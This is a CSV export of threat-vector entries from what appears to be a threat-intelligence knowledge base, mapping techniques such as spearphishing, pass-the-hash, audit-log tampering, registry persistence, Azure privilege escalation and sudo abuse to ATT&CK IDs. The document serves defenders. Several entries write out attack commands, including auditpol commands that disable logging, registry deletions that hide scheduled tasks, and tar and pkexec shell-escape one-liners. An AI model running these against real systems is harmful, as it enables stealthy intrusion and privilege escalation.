UUID,Name,Type,Tlp,Description,Version,Created,Modified,Childs,Parents,Chaining,Threat Actors,ATT&CK
dd5d942c-bac4-4000-b9a6-ca4fef6cfb84,Spearphishing Attachment,Threat Vectors,clear,"Spearphishing messages are often crafted using pernicious social engineering
techniques.

In Spearphishing Attachment attacks, recipients receive emails that contain
malicious attachments. The email message entices users to open the
attachment(s) using the knowlege gained.

- displayed sender name is known by the recipient
- topic/subject is in the field of activity of the recipient
- urgency of user action (less relevant TTP for spearphishing emails)

These attachments look like valid files. In some cases, they are disguised
as MS Office, PDF files or CV files ref [5]. It could be that the attacker
manage to capture a legit document, weaponise it and send it to (new)
recipients (it has been observed that such attack can occur within tens of
minutes after the original legit document was released). In addition, there
have also been reports of TAMs sending malicious PowerPoint (PPSX) files
that exploit vulnerabilities and emails with Word document attachments that
do not require macros to be enabled in order to execute.  

Attachments may:

- contain links leading to a page for credential harvesting.
- be weaponized to install malicious software on the computer of the user or
run some actions on the device;
- or open a decoy document. This is quite frequent in attack conducted by TA
when the malware within the attachment makes some check and assess that the
was not opened on the targeted organisation. Decoy document are meant to
evade detection and avoid raising alert or recipient report to cyber
security team, such as emails with attached Word documents that do not
require enabling macros to execute.

## Common techniques to evade detection

Attackers may use several way to try to hide visually the true nature of
the file.

### Double extensions

Attackers may use double extensions to masquerade the true file type to 
trick users into opening files that might seem safe. But this TTP is quite
well addressed at front email gateway (blocking by default file with several
extension, usually also when within a compressed file). 

### Password-protected attachment

Malicious password-protected archive files are designed to deceive users
and bypass commonly deployed inspection engines to deliver malware and 
ransomware down to a user endpoint. If the Email Security tool detects a
password-protected attachment, it will scan the metadata of the file;
not the content.

### Right-to-Left Override (RLTO)

Another technique is to hide the real file extension is Right-to-Left 
Override (RLTO). Windows supports languages that are written from right 
to left using a Unicode character that causes the text that follows it 
to be displayed in reverse, this method is used to blend the real file 
extension with the file name.
",3,2022-03-14,2025-09-23,,,,"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878, [Enterprise] Gamaredon Group, Gamaredon Group, [Mobile] APT28, APT28, [Enterprise] Mustang Panda, RedDelta, [Enterprise] TA505, TA505, RomCom",T1566.001
ca2751c7-8641-4fb0-a90b-30c5987015dc,Externally controlled Azure credentials added to an Enterprise app or its SPN,Threat Vectors,clear,"Threat actors may assign valid azure credentials to an Azure Enterprise App or its SPN (service
principal). NSA writes in its advisory that the app was seen leveraged
to access emails from the Enterprise app, but the attack vector could be
used for many other types of leverage.
",1,2022-11-28,2022-11-28,,,,,T1098.003
9b41d6cf-de4d-44d1-97cc-f3671f4ee5ab,Azure - Public Accessible Resource,Threat Vectors,clear,"In Azure, this technique highlights the risk where certain resources—commonly **Network Interfaces** 
and **Virtual Machines**—have public IP addresses or open ports, making them directly 
reachable from the internet. Unlike other reconnaissance techniques, this isn’t 
just about discovering resource metadata but about identifying resources configured 
(intentionally or not) for public access.

#### How Attackers Use This Vector

- **Discovery Phase:** Attackers or researchers employ automated tools and scan 
internet-facing IP space, hunting for live Azure VMs, network interfaces, and endpoints 
whose public exposure can be confirmed.
- **Enumeration Approaches:** 
  - **Subdomain/Service Pattern Scanning:** Many Azure services use predictable 
  domain structures (e.g., `*.azurewebsites.net`, `*.blob.core.windows.net`). 
  Attackers enumerate these to find exposed resources.
  - **Open Ports Scans:** Tools scan IPs for open RDP, SSH, web, or management ports.
- **Public APIs and Metadata:** Some Azure resource information is available through 
public APIs or unauthenticated metadata services, providing further opportunities 
for adversaries to discover exposed resources.
- **Real-World Tools:** Well-known tools include MicroBurst, AADInternals, and custom 
scripts for mass scanning.
  
#### Specific Azure Resources at Risk

- **Network Interfaces:** Networking components that, if tied to public IPs, may 
expose internal workloads.
- **Virtual Machines:** Especially those configured with public IPs and ports like 
RDP (3389) or SSH (22) open.
- **App Services and Blob Storage:** Though not explicitly listed in AZT103, these 
are also frequent targets for enumeration due to default public endpoints.
- **Databases/Clusters:** Services like Azure Data Explorer or managed databases 
may be misconfigured to allow public ingress.

#### Security Implications

- **Increased Attack Surface:** Exposing resources multiplies the number of direct 
entry points for adversaries.
- **Brute-Force and Vulnerability Exploitation:** Resources with public connectivity 
are subject to constant automated attacks and vulnerability scans.
- **Potential Lateral Movement:** Compromising one public resource can serve as 
a foothold to move deeper into the Azure environment.
",2,2025-07-31,2025-09-04,,,{'support::synergize': ['b1593e0b-1b3b-462d-9ab6-21d1c136469d']},,"T1580, T1046, T1133"
5ea50181-1124-49aa-9d2c-c74103e86fd5,Pass-the-hash on SMB network shares,Threat Vectors,clear,"In a **Pass-the-Hash attack (PtH)**, Attackers may use offensive tools to load 
the NTLM hash and try to connect to SMB network shares that are reachable 
from the attacker device (SMB port is open to the internet - initial access) 
or from a compromised station under attacker's control - lateral movement. 

Crackmapexec is an excellent tool to try to connect to SMB network 
shares using NTLM hash (PtH).  

It scales really well as you can simply point and shoot at a whole 
subnet or list of IP addresses.  

Attacker may obtain read-only access to SMB network shares and could retrieve 
additional information.  

They may get write access to the share and then be able to drop files 
that victims might be enticed to open or to execute.
",2,2023-08-30,2025-10-01,,,{'sequence::succeeds': ['02311e3e-b7b8-4369-9e1e-74c0a844ae0f']},"[Mobile] APT28, APT28, [Enterprise] APT1, APT1, [Enterprise] APT39, APT39, [Enterprise] APT32, APT32, [ICS] APT33, APT33, [Enterprise] Aquatic Panda, Tonto Team, [Enterprise] Blue Mockingbird, [Enterprise] BRONZE BUTLER, Tick, [Enterprise] Cobalt Group, Cobalt, [ICS] FIN6, FIN6, [Enterprise] Fox Kitten, Fox Kitten, [Enterprise] HAFNIUM, HAFNIUM","T1003.001, T1550.002, T1021.002"
23f6a192-a25d-48b8-a235-7bb55e483682,Persistence with Azure Automanage Machine Configuration,Threat Vectors,clear,"Azure Policy enables administrators to define, enforce and remediate
configuration standards on Azure resources and even on non Azure assets
using Azure Arc. One key feature, that was released in 2021, is the
guest configuration feature of Azure Policy. Azure Policy Guest 
Configuration is now called Azure Automanage Machine Configuration. 

Adversaries may use this functionality to gain persistence in an Azure 
environment if they have gained the necessary permissions within the 
subscription. And since Azure VMs are in many cases directly integrated 
in the on-Premises Active Directory it is possible to gain additional 
access there.
",2,2022-04-28,2023-01-06,,,,,T1484.001
36694031-a3d8-474e-b0e6-f44ba94c2a22,Change the audit policy to disable Windows event logging,Threat Vectors,clear,"A threat actor may change an audit policy setting with the purpose of
disabling Event logging for specific entries. Usually the threat actor will
disable specific audit policy entries, but other scenarios can be imagined.

For example, they can change the audit policy settings manually, with
PowerShell or other scripts, through the registries or by using
Command-line interface.

Examples: 

Command-prompt (cmd) interface:

auditpol /set /category:""Account Logon"" /success:disable /failure:disable

Where /success or /failure are parameters used for disabling of successful
or failed events.

auditpol /Set /Category:* /success:disable

Where the parameter /Category is used to delete only specific category, set of
categories or all of them as shown in the example with wildcard (*) character.

auditpol /clear /y
auditpol /remove /allusers

The both commands are used to clear the audit policy settings

PowerShell commands to modify Audit policies:

auditpol /get /category:*
or auditpol /list/category
PS ~> $AuditPolicyReader::GetClassicAuditPolicy()

Example for a PowerShell script that change the audit policy to audit
successful logon events on the local computer. A threat actor can modify
the $GPO and $SecuritySettingsPath variables to target a different GPO or
security setting, also can modify $AuditSettingName and $AuditSettingValue
variables to change the audit policy to a different setting or value.

Import-Module GroupPolicy
$GPO = ""LocalGPO""
$SecuritySettingsPath = ""Computer Configuration\Windows Settings\Security Settings""
$AuditSettingName = ""Audit Logon Events""

# Set the value for the security setting.
# The values are:
# 0 = Success and Failure
# 1 = Success
# 2 = Failure

$AuditSettingValue = 1
$SecuritySettings = Get-GPRegistryValue -Name $GPO -Key $SecuritySettingsPath | Select-Object -ExpandProperty Values
$AuditSetting = $SecuritySettings | Where-Object { $_.Name -eq $AuditSettingName }
$AuditSetting.Value = $AuditSettingValue
Set-GPRegistryValue -Name $GPO -Key $SecuritySettingsPath -Value $SecuritySettings
gpupdate /force


For advanced policies, threat actors can use /r to get a csv-formatted table:

auditpol /get /category:'Account Logon' /r | ConvertFrom-Csv | 
Format-Table 'Policy Target',Subcategory,'Inclusion Setting'

Manual change: 

If the service secpol.msc is running, then a threat actor can navigate to
Security Settings\Local Policies\Audit Policy to modify the basic policy
settings or navigate to Security Settings\Advanced Audit Policy
Configuration to modify advanced policy settings.
",3,2023-01-05,2023-01-06,,,,"[Enterprise] APT29, UNC2452, [Mobile] Sandworm Team, GreyEnergy, [Enterprise] Threat Group-3390, APT27",T1562.002
682bf600-ec3e-4780-9f8f-8305ac602bef,Change file owner to a privileged account,Threat Vectors,clear,"Adversaries seeking to gain or maintain elevated privileges often target the 
ownership and permissions of critical files or directories. By changing a 
file’s owner to a privileged account (e.g., SYSTEM on Windows, `root` on Linux, 
or `root:wheel` on macOS), threat actors ensure that their malicious tools, 
binaries, or configuration files inherit elevated trust levels. 
This manipulation can facilitate various malicious objectives, including 
executing code with higher privileges, bypassing security controls, 
and evading detection.  

### Windows

Attackers may use built-in utilities such as `takeown.exe` or `icacls.exe` 
to change ownership and grant Full Control permissions to a high-privilege 
user or group.  

For instance:  
```powershell
takeown.exe /f C:\sensitive_data.txt
icacls.exe C:\sensitive_data.txt /setowner Administrator
icacls.exe C:\sensitive_data.txt /grant Administrator:F
```

By doing so, they can ensure that subsequent manipulations of these files, 
including the addition of backdoors, data exfiltration tools, 
or credential-stealing binaries, are executed under a privileged context.  

### Linux and macOS

Threat actors mainly rely on the `chown` command to modify file ownership. 
But other commands may achieve the same objective like chgrp or setfacl 

For example:
```bash
sudo chown root:root /usr/local/bin/malicious_script
```

Once a file is owned by `root`, it can be paired with setuid bits 
or extended attributes, enabling the file to run with elevated privileges. 
",1,2024-12-13,2024-12-13,,,,"[Enterprise] APT29, UNC2452, [ICS] Wizard Spider, UNC1878",T1222
d2ca077d-6ec6-4442-bdc5-b1822e9f4ae8,Deletion of Tasks or Tree registry keys in scheduled task hives,Threat Vectors,clear,"Threat actors are using deletion of tree registry keys to remove
information related to their activities, for example created previously
scheduled tasks. For the deletion of tree registry keys, the threat actors
are using reg command in command-line utility with a parameter delete,
PowerShell commands or scripts or manually delete the registry keys from
Registry Editor (regedit). In Azure cloud infrastructure threat actors use
Azure CloudShell to delete registry keys.

Example for registry keys created upon creation of a new scheduled task:

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\{GUID}

The registy keys above can be deleted using the ""reg delete"" command. The 
""reg delete"" command deletes the specified registry key and all of its 
subkeys.

reg delete ""HKEY_LOCAL_MACHINE\Registry_Key"" /f

Examples for deleting registry keys with PowerShell commands:

Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME -Force -Verbose

or

Get-Item Remove-Item -Path HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\TASK_NAME | Remove-Item -Force -Verbose

Where Get-Item command retrieves the Key name and then Remove-Item uses the
result from Get and deletes the key registry.

To delete registry keys using Azure CloudShell threat actors are using
Remove-ItemProperty cmdlet in Windows PowerShell or the rm command in Bash.

Examples:

Remove-ItemProperty -Path ""HKLM:\Software\MyKey"" -Name ""MyValue""

rm ""HKLM:\Software\MyKey""
",4,2022-12-19,2022-12-20,,,,"[Enterprise] HAFNIUM, HAFNIUM","T1053.005, T1564"
5e66f826-4c4b-4357-b9c5-2f40da207f34,Scheduled tasks to maintain persistence in registry,Threat Vectors,clear,"A threat actor can successfully maintain persistence on a compromised system 
by using scheduled tasks to create or edit registry entries.

Windows Scheduled Task is a feature of the Windows operating system that 
allows users to schedule a command or program to run automatically at a 
specific time or interval. This can be useful for running tasks that need to
be performed regularly, such as backing up files or checking for updates. 
Scheduled tasks can be configured to run in the background, without the need
for user intervention.

One example for a scheduled task that establish persistence in the registry 
is a task that is configured to run when specific condition is met - as 
example on system start up. The task will have an action configured, which 
might be to download and run a payload, which for example could be a payload
that sets a registry run key. Registry run keys are keys in the Windows 
registry that are called during system start up. These keys enable 
configurations to be loaded automatically. Registry run keys can also 
directly execute binary files on system start up. 

To create a scheduled task that runs at system startup attackers are using 
for example Windows Task Scheduler, cmd.exe or PowerShell commands in a 
script. Once the task has been created, it will be added to the registry and 
will run automatically every time the system starts up, or until discovered 
and deleted.

**Examples for mechanism of persistence in the registries**

 - Run/RunOnce Keys: Malware can add entries to the registry keys
 (or their RunOnce counterparts) to execute every time the system
 boots or a user logs in. An example for such Reg keys:
 
 ` HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run `
 
 or 
 
 ` HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run `
 
 
 - Scheduled Tasks: Utilizing the Task Scheduler, malware can create
 tasks that run at specific intervals or times, ensuring persistence.
 These tasks are often registered in the registry under
 
 ` HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache `.

 - Windows Services: Malicious services can be installed and configured
 to start automatically upon system boot. These are typically registered
 under `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services`.

### Additional persistence techniques

Other common techniques used by malware in general include:

- **Modifying Registry Keys**: Malware often alters specific registry keys 
(like those in `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`) 
to ensure they are executed at startup.

- **Modifying Registry Keys**: The following enables the malware to run for all 
users on the system: (HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run)

- **Using Startup Folders**: Malware can place executable files in startup
folders so that they run automatically when a user logs into their account.   
",6,2022-12-14,2025-06-11,,,{'sequence::succeeds': ['dd5d942c-bac4-4000-b9a6-ca4fef6cfb84']},"[Enterprise] HAFNIUM, HAFNIUM, [Enterprise] Fox Kitten, Fox Kitten, [Enterprise] APT29, UNC2452","T1053.005, T1112"
c7e260d8-d391-41eb-be1a-7f276c99b383,Azure app registration - privilege escalation,Threat Vectors,clear,"Azure app registration privilege escalation is a significant threat vector where 
attackers exploit misconfigured or compromised application registrations to gain 
elevated access in Azure environments. This occurs when attackers leverage excessive 
permissions associated with service principals or app registrations to bypass role-based 
access controls (RBAC).

### Key Attack Vectors  
**1. Service Principal Ownership Abuse**  
Owners of Azure applications can modify service principal permissions. For example, 
a user with **Reader** role but ownership of an application could execute commands like:  
```bash
az role assignment create --assignee ""[email protected]"" --role ""Owner"" --scope ""/subscriptions/Production""
```
This grants **Owner** privileges, enabling resource creation/deletion and further 
role assignments.  

**2. Dangerous API Permissions**  
App registrations with high-privilege Microsoft Graph API permissions pose critical risks:  
- **AppRoleAssignment.ReadWrite.All**: Allows granting admin consent and assigning 
roles like **RoleManagement.ReadWrite.Directory** (enables Global Admin escalation).  
- **Directory.ReadWrite.All**: Permits modifying Azure AD group memberships.  
- **User.ReadWrite.All**: Enables password resets and profile modifications.  

**3. Phishing-Driven Attacks**  
Attackers with a compromised standard user account can:  
1. Register an app with ""Accounts in any organizational directory"" and phishing redirect URIs.  
2. Configure high-risk Graph API permissions (e.g., *Mail.Read*, *User.Read.All*).  
3. Send phishing links to victims, capturing access tokens via a malicious OAuth server.  

### Exploitation Workflow  
- **Step 1**: Compromise a low-privileged account.  
- **Step 2**: Create or modify an app registration to include dangerous permissions.  
- **Step 3**: Use the app’s client ID/secret to authenticate and execute privileged 
operations (e.g., adding users to admin groups).  
- **Step 4**: Escalate to **Global Admin** via *RoleManagement.ReadWrite.Directory*.  
",3,2025-05-23,2025-09-08,,,"{'support::enabled': ['bb2501d5-99c7-44a6-ac5a-9510102d6611', '2743bf18-3b86-4721-bf3e-153dcda0b149', 'fe6827f2-efb4-43b3-9ca3-b7d417111b32']}",,"T1098, T1068"
e2b93649-44d7-4007-9592-3baf79cd2b33,Deletion of Security Descriptor (SD) value in registry for scheduled task,Threat Vectors,clear,"A Security Descriptor (SD) is a data structure that specifies the security
attributes of an object in Windows operating system. These attributes
include the permissions and access rights granted to users and groups, as
well as any security measures that have been applied to the object.

Security Descriptor determines the users allowed to run specific task. If
the SD value is deleted within the registry tree path, this deletion
results in “disappearing” of the task from “schtasks /query” and Task
Scheduler.

Some malware families, for example Tarrask malware can use security
descriptors to create scheduled tasks that are hidden from the user and are
not visible in the Windows Task Scheduler. These tasks are used to execute
the malware's malicious payload, which can include installing additional
malware, stealing sensitive information, or disrupting the normal operation
of the infected system.

To evade detection, a malware modifies the security descriptor of the
scheduled task to grant only the SYSTEM account access to the task. This
means that other users and security tools will not be able to see or
interact with the task, making it more difficult to detect and remove.

Security professionals can use tools such as Sysinternals Autoruns and
Process Explorer to identify and remove these hidden scheduled tasks, as
well as other forms of malware that use security descriptors for defense
evasion.
",2,2022-12-16,2022-12-19,,,,"[Enterprise] HAFNIUM, HAFNIUM",T1053.005
41f57a57-1ed6-407e-bb70-a0f6ab52af10,Azure - Storage Blobs Reconnaissance,Threat Vectors,clear,"Reconnaissance targeting Azure Storage Blobs involves gathering intelligence to identify
exposed storage accounts, containers, and blobs-often without authentication or detection.
Azure’s predictable URL structure, common naming conventions, and potential for
misconfiguration make it a prime target for such activities.

### Discovery of Storage Accounts

- **DNS and Subdomain Enumeration:**  
Each Azure Storage account is accessible via a unique subdomain
(e.g., `yourstorageaccount.blob.core.windows.net`).   
Attackers use DNS enumeration tools (like `dnscan`) and wordlists to guess or 
discover valid storage account names. They often use company names, abbreviations, 
or product names as starting points.

- **Search Engine Dorking:**  
Publicly accessible blobs and containers may be indexed by search engines. Attackers 
leverage advanced search queries (Google dorking), such as `site:*.blob.core.windows.net`, 
to find open blob storage accounts and even specific file types (e.g., `.csv`, `.xlsx`) 
or keywords like `""password""`.

### Enumeration of Containers and Blobs

- **URL Pattern Guessing:**  
Azure Blob Storage uses predictable URL patterns for containers and blobs. Attackers 
automate requests to likely container names (e.g., `backups`, `images`, `prod`) 
and blob names, increasing the odds of finding exposed data.

- **Automated Scanning Tools:**  
Tools like MicroBurst, goblob, and custom scripts are used to automate the enumeration 
of storage accounts, containers, and blobs. These tools can quickly test thousands 
of possible names, scaling up the reconnaissance process.

- **Custom Wordlists:**  
Attackers may build custom dictionaries based on the target’s business, products, 
or previously leaked information to improve the accuracy of their enumeration efforts.

### Analysis of Exposed Data and Metadata

- **Monitoring Access Patterns:**  
By analyzing metadata (timestamps, blob sizes, file types), attackers can infer 
which blobs or containers are most likely to contain sensitive or valuable information.

- **Chaining Exposures:**  
If attackers find an exposed blob, they may discover references within the files 
themselves (e.g., database connection strings, links to other storage accounts), 
allowing them to recursively enumerate and compromise further resources.

### Tenant and Service Enumeration

- **Azure Tenant Discovery:**  
Attackers can leverage known company domains or public APIs to enumerate Azure tenants 
and services, including blob storage endpoints. Tools like MicroBurst and AADInternals 
automate the discovery of tenant IDs and service endpoints, providing additional 
reconnaissance data.

### Reconnaissance Characteristics

- **Silent and Non-Intrusive:**  
Most reconnaissance activities are passive and do not require authentication, making 
them difficult to detect until exploitation occurs.

- **Scalable and Automated:**  
Attackers can automate the entire process, rapidly scanning large numbers of potential 
storage accounts and containers.

### Real-World Impact

- **Sensitive Data Exposure:**  
Even a single misconfigured blob can expose sensitive data, credentials, or internal 
documentation, which can be leveraged for further attacks.

- **Pivoting and Lateral Movement:**  
Exposed blobs may contain information that allows attackers to pivot to other services 
or escalate their access within the target environment.
",3,2025-05-07,2025-09-08,,,"{'support::enabled': ['53f4e2f0-7d11-4629-bb26-905993a589db', '2743bf18-3b86-4721-bf3e-153dcda0b149', 'b1593e0b-1b3b-462d-9ab6-21d1c136469d', '53063205-4404-4e6d-a2f5-d566c6085d96']}",,"T1530, T1552, T1619, T1567, T1190"
025c73c6-f1a6-4382-a64f-38cfe81f8dc6,Container privilege escalation via kernel or container runtime exploit,Threat Vectors,clear,"Vulnerabilities in container runtime (Docker, containerd, etc.) or kernel 
(Linux or Windows) can be exploited by a threat actor with execution 
ability to jump out from container to host system and gain 
root/administrator privileges depending on vulnerability type. 
",2,2022-09-15,2022-12-21,,,,"[Enterprise] APT29, UNC2452, [Enterprise] APT32, APT32, [ICS] APT33, APT33, [Enterprise] Cobalt Group, Cobalt, [Enterprise] Tonto Team, Tonto Team, [Enterprise] Turla, Turla, [Enterprise] Whitefly, Whitefly, [Mobile] APT28, APT28, [ICS] FIN6, FIN6, [Enterprise] Threat Group-3390, APT27, [Enterprise] TeamTNT, TeamTNT","T1068, T1611"
f8876b38-ed54-495f-bd40-758211b9d6ee,Apple WebKit exploited for arbitrary code execution,Threat Vectors,clear,"WebKit is a cross-platform browser rendering engine used in Safari
and other applications across macOS, iOS, and other platforms.

Due to Apple's restrictions, even Chromium-based browsers on iOS,
such as Google Chrome and Microsoft Edge, rely on WebKit, making
them vulnerable to this exploit as well. According to Apple,
this issue may have been exploited against specific targeted
individuals on versions of iOS before iOS 17.23 ref [2].    

The WebKit vulnerability (CVE-2025-24201) is an out-of-bounds write 
vulnerability and Apple notes it as a zero-day exploited remotely. 
It allows attackers to bypass WebKit's sandbox and achieve arbitrary 
code execution on affected devices. The vulnerability requires user
interaction in order to be triggered. For more details ref [6].        

The vulnerability requires user interaction in order to be triggered.
From the analysis and the information in the reports what is known until
now is that the exploit code is not publicly available and the Webkit
component presents in software used by multiple Union entities.   

From the available information until now, the known affected
products are chromium-based browsers on the following platforms: 
macOS, iOS, iPadOS ref [1], [2].  

Apple is also known for emailing affected users, despite the 
limited amount of information on the Threat Alert, as confirmed by 
CERT-EU, in case of exploitation detected by Apple notification 
will be sent.    
",1,2025-03-18,2025-03-26,,,,,"T1588.006, T1588.005"
fe6827f2-efb4-43b3-9ca3-b7d417111b32,Azure - Gather Application Information,Threat Vectors,clear,"This technique involves adversaries collecting data about applications running within Azure, 
especially those registered in Azure Active Directory (Azure AD). The goal is to 
gain insight into application properties, configurations, exposed endpoints, permission 
scopes, and connections, in order to identify potential attack paths or vulnerabilities.

### Example Attack Scenario

An adversary, during an initial reconnaissance campaign, uses publicly accessible 
APIs and Azure Active Directory (AAD) enumeration techniques to gather information 
about applications registered within the target's Azure tenant. By leveraging permissions 
such as `microsoft.directory/applications/*/read`, the attacker can identify applications, 
service principals, their permissions, owners, secrets, and roles. For instance, 
an attacker using a compromised regular user account attempts to list all AAD applications 
and their configurations. They extract details on app registration, API permissions, 
and whether any apps have high privilege assignments, such as access to sensitive 
data or elevated directory permissions. This information is used to map potential 
targets for privilege escalation or lateral movement.

### Attack Goals and Impact

- **Goals:**
  - Identify high-value applications and their associated service principals.
  - Determine application permissions and trust relationships within AAD.
  - Uncover misconfigurations, excessive privileges, or applications with weak security 
  controls.
  - Establish a list of applications for further exploitation, such as app impersonation, 
  secret harvesting, or abuse of delegated permissions.

- **Impact:**
  - Facilitates subsequent privilege escalation or lateral attacks if vulnerable 
  apps/service principals are identified.
  - May allow attackers to target apps for unauthorized access to sensitive information 
  or execution of high-impact operations.
  - Lays the groundwork for consent phishing attacks or abuse of poorly secured 
  app registrations.
  - Increases the risk of data exposure, unauthorized resource manipulation, and 
  tenant-wide compromises if attackers pivot successfully.

### Attack Flow and Methodology

1. **Data Gathering:**
  - Executes read operations using permissions like `microsoft.directory/applications/*/read` 
  to pull application names, identifiers, associated owners, API permissions, and 
  role assignments.
  - Enumerates app secrets/certificates and checks for possible excessive API scopes, 
  such as Application.ReadWrite.All or RoleManagement.ReadWrite.Directory.

2. **Analysis of Privilege Assignments:**
  - Evaluates permissions and assignments to locate applications with elevated 
  rights or direct access to critical resources.
  - Identifies owners who may be targeted for account compromise or further social 
  engineering.

3. **Planning Further Attacks:**
  - Maps application interrelationships and privilege chains to design next-phase 
  attacks, such as credential theft, application takeover, or phishing consent requests.
  - Assesses whether any applications are misconfigured, exposing endpoints or 
  secrets unintentionally.

4. **Use of Discovered Data:**
  - Uses harvested application data to target privilege escalation (e.g., adding 
  new credentials to an app as seen in advanced API permission abuse scenarios).
  - May initiate attacks such as impersonation using app secrets or deploying malicious 
  applications with elevated permissions.
",2,2025-08-18,2025-09-08,,,"{'support::enabled': ['140907eb-c9fb-4330-9d71-656422388b2b', '53063205-4404-4e6d-a2f5-d566c6085d96'], 'support::enabling': ['ca2751c7-8641-4fb0-a90b-30c5987015dc', 'c7e260d8-d391-41eb-be1a-7f276c99b383']}","Volt Typhoon, Kimsuky, Sandworm, [Enterprise] Star Blizzard","T1078.004, T1110, T1555"
422098a7-567e-47fe-9e92-9fd3ec6df768,Adversary abuses sudo elevation control mechanism,Threat Vectors,clear,"Sudo is a command-line utility for Unix and Linux-based systems that can
provide an effective way to give specific user permissions to run root
(most powerful) level commands on the system. Unfortunately, some
misconfigurations in sudo functionality can allow threat actors to escalate
their privileges to root access.

If the file /etc/sudoers (used to store all sudo privileges) is modified
this can grant to the attacker elevation of privileges. Attackers may use
custom parameters with sudo to edit the sudoers file. For example -f or -l
can be used to edit this file or list which commands or binaries the
current user has access to run.

GTFOBins is a list of Unix binaries which is used by the threat actors to
bypass local security restrictions in misconfigured systems. GTFOBins
allows to search for binaries or commands whether they are executed as sudo
and if they provide access to normally restricted actions. The repo list
contains 300+ commands that could be abused for different purposes if not
configured using this filter. The current list is an open collaborative
project. Link: https://gtfobins.github.io/#+sudo

Examples: 

A ""tar"" option can be exploited to write to arbitrary files (works only for
GNU tar). If write data to files, it may be used for privileged writes on
the files ouside a restricted file system. A ""tar"" command can break out
from restricted environments, using spawn of an interactive system shell.

Reference: https://gtfobins.github.io/gtfobins/tar/

tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

For GNU tar:
tar xf /dev/null -I '/bin/sh -c ""sh <&2 1>&2""'

or (for GNU tar when limited command argument injection is available)

TF=$(mktemp)
echo '/bin/sh 0<&1' > ""$TF""
tar cf ""$TF.tar"" ""$TF""
tar xf ""$TF.tar"" --to-command sh
rm ""$TF""*

The pkexec command can be exploited to gain a root shell and to access the
file system, escalate or maintain privilege access. 

Reference: https://gtfobins.github.io/gtfobins/pkexec/

sudo pkexec /bin/sh
",3,2022-10-27,2022-12-21,,,,,T1548
